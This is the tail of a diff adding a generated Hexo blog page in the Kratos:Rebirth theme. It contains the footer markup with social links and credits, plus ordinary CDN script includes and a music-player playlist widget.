+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://t.me/CandyUnion"><i class="fa fa-telegram"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="me" href="https://nya.one/@Candinya"><i class="fa fa fa-share-alt-square"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Candinya"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2021 Ma4out7'Blog 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Ma4out7.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script>
+
+<script async src="/js/candy.min.js"></script>
+
+    <script defer src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="3204190542"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
